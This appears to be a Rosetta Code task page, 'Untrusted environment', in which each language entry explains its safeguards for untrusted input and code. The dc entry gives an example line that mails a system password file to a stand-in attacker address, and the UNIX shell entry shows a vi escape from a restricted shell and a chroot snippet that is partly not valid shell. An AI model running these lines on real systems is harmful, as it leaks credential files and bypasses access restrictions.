+++
title = "Untrusted environment"
description = ""
date = 2019-08-19T09:34:14Z
aliases = []
[extra]
id = 12812
[taxonomies]
categories = ["task"]
tags = []
languages = [
  "c",
  "dc",
  "go",
  "j",
  "kotlin",
  "pari_gp",
  "perl",
  "perl_6",
  "phix",
  "racket",
  "rexx",
  "ruby",
  "rust",
  "scala",
  "tcl",
  "unix_shell",
  "zkl",
]
+++

Sometimes it is useful to run code with inputs from untrusted users, untrusted code, etc. Explain and demonstrate the features your language uses for dealing with untrusted input and untrusted code. Explain possible compromises, weaknesses and exploits that may be available through the language (for example forcing execution of something outside of the application) as a result of using untrusted data sources.

The intention is that the definition is to be interpreted broadly; different languages will solve this task in very different ways and with (generally) incomparable results.


## C

C is a double edged sword. It was designed to allow programmers to do virtually anything and everything. The aim was as a high level language to be close as possible at the computer hardware (CPU and memory). This gives the property of C to being fast. Therefore its possible to write large parts for Operating Systems with it. The ability to access memory at the bit level, embed assembly directly and yet be readable ( or unreadable ) by humans, resulted in a language which forms the foundation of the world as we know it.

In other words, there is no check. Users and programmers can do anything they want. There is no sandbox, no off-limits area. Unless it is explicitly forbidden by the compiler or the operating system, a C program without sufficient and necessary checks will result in 'unintended and unforeseen' consequences with the 'appropriate' inputs.

On the bright side, programming in C disciplines the programmer, nothing like a grueling boot camp or war time conscription to make one appreciate the niceties of a Java, Perl, Python or Haskell.

But try writing an operating system with them...

With great power, comes great responsibility. :)


## dc


Beware of allowing user input to fed to the reverse polish calculator. It has the ability to run shell commands, and this could be a security risk:


```dc
`!'cat /etc/password|mail badguy@hackersrus.com
```



## Go

Go is generally a safe language. In particular, whilst pointers are supported, arithmetic on them is not and so it's not possible to use pointers to poke around within the language's internal structures or to point to arbitrary memory locations. 

However, there are occasions (usually for performance reasons or to do things which - whilst desirable - wouldn't otherwise be possible) when pointer arithmetic is needed and Go provides the 'unsafe' package for these occasions.

This package contains functions which allow one to determine the size/alignment of various entities and the offset of particular fields within a struct as well as to perform pointer arithmetic.

The following example shows how to use a combination of reflection and pointer arithmetic to indirectly (and unsafely) change the contents of a byte slice. 

```go
package main

import (
    "fmt"
    "reflect"
    "unsafe"
)

func main() {
    bs := []byte("Hello world!")
    fmt.Println(string(bs))
    g := "globe"
    hdr := (*reflect.SliceHeader)(unsafe.Pointer(&bs))
    for i := 0; i < 5; i++ {
        data := (*byte)(unsafe.Pointer(hdr.Data + uintptr(i) + 6))
        *data = g[i]
    }
    fmt.Println(string(bs))
}
```


```txt

Hello world!
Hello globe!

```



## J

J has some security mechanisms built in, and they are detailed below.  But to understand their scope (and limitations), it's probably helpful to provide some context first.

J is a [[wp:Function-level programming|function-level]] language, expressed with composition of primitive words, like <tt>+</tt> for plus and <tt>!</tt> for factorial and <tt>@</tt> for function-composition and <tt>/</tt> for reduce, etc. 

Because J is also (mostly) [[wp:Functional programming|functional]], almost all of these primitive words are also "native": that is, they stay within the bounds of the execution environment, and cannot reach outside of it to the host system.  They cannot even effect J's own memory space, except through assigning variables.

In fact, there is only one word which can reach outside the execution environment (the functional scope of the program): '''<tt>!:</tt>''', the aptly named "foreign" operator.  This one operator encapsulates all access to the outside world, and even the "behind the scenes world" of J's own memory space. 

The operator takes two arguments and derives a function, which specifies which kind of foreign interface you want.  For example, <tt>1'''!:'''1</tt> is the specific function to read a file, and <tt>1'''!:'''2</tt> is the function to write one (as in <tt>1'''!:'''1 'filename'</tt> and <tt>some_data 1'''!:'''2 'filename'</tt>, respectively).  The foreign function <tt>15'''!:'''0</tt> allows the J programmer to call a shared library (dll, so, dylib, etc), <tt>2'''!:'''5</tt> reads environment variables (e.g. <tt>2'''!:'''5'PATH'</tt>), and <tt>2'''!:'''55</tt> will terminate the program (quit, die: the mnemonic is that <tt>255</tt> is the "last" value of a byte, and <tt>2'''!:'''55</tt> is the "last" thing you want to do in a J program).  There are many more, grouped into families (the first argument to <tt>'''!:'''</tt> specifies which family you want, e.g. <tt>''1'''''!:'''n</tt> is the ''file'' family, and <tt>1'''!:'''''1''</tt> is specifically the file ''read'' function).

But the key thing is that this one operator, <tt>'''!:'''</tt>, controls ''all'' the dangerous stuff, so if we want to prevent dangerous stuff, we only have to put guards in one place.  And, in fact, we have "foreign controls": foreign functions which themselves control which foreign functions are allowed. In other words, there's only one "door" to J, and we can lock it.

From the J documentation:

:<tt>9'''!:'''25 y</tt> '''Security Level''': The security level is either <tt>0</tt> or <tt>1</tt>. It is initially <tt>0</tt>, and may be set to <tt>1</tt> (and can not be reset to <tt>0</tt>). When the security level is <tt>1</tt>, executing Window driver commands and certain foreigns (<tt>'''!:'''</tt>) that can alter the external state cause a ''“security violation”'' error to be signalled. The following foreigns are prohibited: dyads <tt>0'''!:'''n</tt> , <tt>1'''!:'''n</tt>  except <tt>1'''!:'''40</tt> , <tt>1'''!:'''41</tt>, and <tt>1'''!:'''42</tt> , <tt>2'''!:'''n</tt> , and <tt>16'''!:'''n</tt> .

There are further foreign controls on how much space, or time, a single execution is allowed to take:

:<tt>9'''!:'''33 y</tt> '''Execution Time Limit''': The execution time limit is a single non-negative (possibly non-integral) number of seconds. The limit is reduced for every line of immediate execution that exceeds a minimum granularity, and execution is interrupted with a ''“time limit error”'' if a non-zero limit is set and goes to 0. 

:<tt>9'''!:'''21 y</tt> '''Memory Limit''': An upper bound on the size of any one memory allocation. The memory limit is initially <tt>2^30</tt> on 32-bit systems and <tt>2^62</tt> on 64-bit systems.

With all that said, the language has seen limited use in contexts where code injection is a concern, so these mechanisms are rarely exercised (and somewhat [[J:System/Interpreter/Bugs#security_level_out_of_date|dated]]).


## Kotlin

Kotlin/JVM, which compiles to bytecode rather than to native code, has the same security features as other languages which target the Java Platform. 

In particular the JVM verifies the bytecode to ensure that it cannot branch to invalid locations or address memory outside the bounds of an array. Pointer arithmetic is disallowed as are unchecked type casts.

The JVM also automatically allocates memory for new objects and deallocates memory for objects which are no longer needed using a garbage collector. Manual memory management is not supported.

It is possible to run untrusted bytecode within a 'sandbox' which prevents it from  interfering with the underlying environment. However, programs can also be cryptographically signed by a recognized authority and users can then allow such programs to be run within a trusted environment.

Of course, no system is perfect and a number of vulnerabilities have been discovered in these mechanisms over the years and will doubtless continue to be discovered in the future given the ubiquity of the Java Platform and hence its attractiveness to hackers.


## PARI/GP

GP has a default, <code>secure</code>, which disallows the <code>system</code> and <code>extern</code> commands. Once activated this default cannot be removed without input from the user (i.e., not a script).


```parigp
default(secure,1);
system("del file.txt");
default(secure,0); \\ Ineffective without user input
```



## Perl

Perl can be invoked in taint mode with the command line option <code>-T</code>. While in this mode input from the user, and all variables derived from it, cannot be used in certain contexts until 'sanitized' by being passed through a regular expression.


```perl
#!/usr/bin/perl -T
my $f = $ARGV[0];
open FILE, ">$f" or die 'Cannot open file for writing';
print FILE "Modifying an arbitrary file\n";
close FILE;
```



## Perl 6

Perl 6 doesn't really provide a high security mode for untrusted environments. By default, Perl 6 is sort of a walled garden. It is difficult to access memory directly, especially in locations not controlled by the Perl 6 interpreter, so unauthorized memory access is unlikely to be a threat with default Perl 6 commands and capabilities.

It is possible (and quite easy) to run Perl 6 with a restricted setting which will disable many IO commands that can be used to access or modify things outside of the Perl 6 interpreter. However, a determined bad actor could theoretically work around the restrictions, especially if the nativecall interface is available. The nativecall interface allows directly calling in to and executing code from C libraries so anything possible in C is now possible in Perl 6. This is great for all of the power it provides, but along with that comes the responsibility and inherent security risk. 

Really, if you want to lock down a Perl 6 instance so it is "safe" for unauthenticated, untrusted, general access, you are better off running it in some kind of locked down virtual machine or sandbox managed by the operating system rather than trying to build an ad hoc "safe" environment.


## Phix

Phix makes no attempt to protect anyone from untrusted code or inputs from untrusted users. 

However, in theory it would be reasonably straightforward to build a "crippled" version of phix that makes malicious activity all but impossible.

The most dangerous construct is #ilASM{} (inline assembly), but it should not be difficult to prohibit that except in builtins\ and builtins\VM\ by adding a guard such as 
"if fileno>2 then ?9/0 end if" at the start of procedure ilASM() in pilasm.e. Obviously you simply never put any untrusted code in either of those directories.

The next most dangerous facility is file I/O, for that I might suggest putting similar but run-time guards in builtins\VM\pFileioN.e which get the calling routine number 
from the call stack and then the file number from the symbol table (see [[Stack_traces#Phix]]), and then check that is <=3, ie the above two and the main phix directory, 
since obviously you don't want to cripple I/O for the compiler itself, and in turn that means any untrusted code has to be put in some other directory.

Similarly we have system/system_exec(), c_func/proc(), and call(), all of which you would probably want to disable from untrusted code. 

Lastly I would recommend having a think about disabling libcurl, SQLite, etc, but that's a bit beyond my remit, and I should reiterate from the perl entry that a proper physically separate/expendable sandbox is probably the better idea, when possible.


## Racket

The <tt>racket/sandbox</tt> library provides a way to construct limited evaluators which are prohibited from using too much time, memory, read/write/execute files, using the network, etc.

```racket

#lang racket
(require racket/sandbox)
(define e (make-evaluator 'racket))
(e '(...unsafe code...))

```

The idea is that a default sandbox is suitable for running arbitrary code without any of the usual risks.  The library can also be used with many different configurations, to lift some of the restriction, which is more fitting in different cases.


## REXX

Details for Regina REXX.

REXX is designed to assist in system scripting.  Normally any command that is not a REXX instruction or user added command is passed to the operating system ''or default ADDRESS'' for evaluation.

Regina includes a RESTRICTED mode.  This disables

* LINEOUT, CHAROUT, POPEN, RXFUNCADD BIFs
* "OPEN WRITE", "OPEN BOTH" subcommands of STREAM BIF
* The "built-in" environments eg. SYSTEM, CMD or PATH of ADDRESS command
* Setting the value of a variable in the external environment with VALUE BIF.
* Calling external functions

This mode is started from the command line with the <tt>-r</tt> option.  When embedding Regina for use with application scripting the <tt>RexsStart</tt> API can have the <tt>RXRESTRICTED</tt> bit set in the <tt>CallType</tt> field.

By the way, BIF is short for Built In Function.

For example, given ''cat.rexx'':


```rexx
ADDRESS SYSTEM 'cat cat.rexx'
```


```txt

prompt$ regina cat.rexx
ADDRESS SYSTEM 'cat cat.rexx'
prompt$ regina -r cat.rexx
     1 +++ ADDRESS SYSTEM 'cat cat.rexx'
Error 95 running "/home/user/lang/rexx/cat.rexx", line 1: [Restricted feature used in "safe" mode]
Error 95.5: [Running external commands invalid in "safe" mode]

```



## Ruby

Ruby handles untrusted input with the global variable <code>$SAFE</code>. Settings higher than 0 invoke an increasing level of sandboxing and general paranoia.

```ruby
require 'cgi'
$SAFE = 4
cgi = CGI::new("html4")
eval(cgi["arbitrary_input"].to_s)
```



## Rust


While Rust does not have a sandboxed execution mode of its own, it has some of the best support available for compiling to WebAssembly, which ''is'' explicitly designed to be sandboxed and has multiple runtime environments in development.


## Scala


Talking about high-level computer programming languages, they aim to address problems in a user domain rather than problems close to the machine as assembly languages do. The machine is already shielded by this aim and prevents the programmer from irrelevant machine details. A high-level language has in respect with an assembler no 'right on the bare silicon' programmers nor memory model.

Another objective of a high-level language is to be platform-independent and consequently being machine-independent.
Scala is supported for the following target platforms:
* the JVM 'Write once, run anywhere' platform,
* embedded and mostly sandboxed ECMAScript (JavaScript) engines (internet browser, Node.js),
* on the Microsoft .Net platform (obsolete)
* Scala Native for the LLVM infrastructure (generates machine-code)


Each of these target platforms, and subsequently the operating system, has its own specific vulnerabilities and countermeasures.

It's better to solve the problems there where they arise.


## Tcl

Tcl allows evaluation of untrusted code through ''safe interpreters'', which are evaluation contexts where all unsafe operations are removed. This includes access to the filesystem, access to environment variables, the opening of sockets, description of the platform, etc.

```tcl
set context [interp create -safe]
$context eval $untrustedCode
```

Because the only way that Tcl code can perform an operation is by invoking a command if that command is not present in the execution context then the functionality is gone.

It is possible to profile in restricted versions of operations to allow things like access to built-in packages.

```tcl
set context [safe::interpCreate]
$context eval $untrustedCode
```

These work by installing aliases from the otherwise-removed commands in the safe interpreter to implementations of the commands in the parent master interpreter that take care to restrict what can be accessed. Note that the majority of unsafe operations are still not present, and the paths supported to the packages are virtualized; no hole is opened up for performing unsafe operations unless a package author is deliberately careless in their C implementation.


## UNIX Shell



###  Enclose variable references in double quotes 


Variable references should be contained in double quotes to prevent an empty string causing an error as a result of omission during evaluation:

```sh
# num=`expr $num + 1` # This may error if num is an empty string
num=`expr "$num" + 1` # The quotes are an improvement
```



###  Do not allow users to run programs that can launch a new shell 


Traditional Unix provides a restricted mode shell (rsh) that does not allow the following operations:

* changing directory
* specifying absolute pathnames or names containing a slash
* setting the PATH or SHELL variable
* redirection of output

However, the restricted shell is not completely secure. A user can break out of the restricted environment by running a program that features a shell function. The following is an example of the shell function in vi being used to escape from the restricted shell:


```vi
vi
:set shell=/bin/sh
:shell
```



###  Use a chroot jail 


Sometimes chroot jails are used to add a layer of security to

```bash
mkdir ~/jail
cd ~/jail;
chroot ~/jail;
setuid(9); # if 9 is the userid of a non-root user
rm /etc/hosts # actually points to ~/jail/etc/hosts
```



## zkl

Basically, there is no trusted mode. If the OS lets you do it, you can.
This means internet access, file system examination/modification, forking processes, pulling in arbitrary source code, compiling and running it, etc.
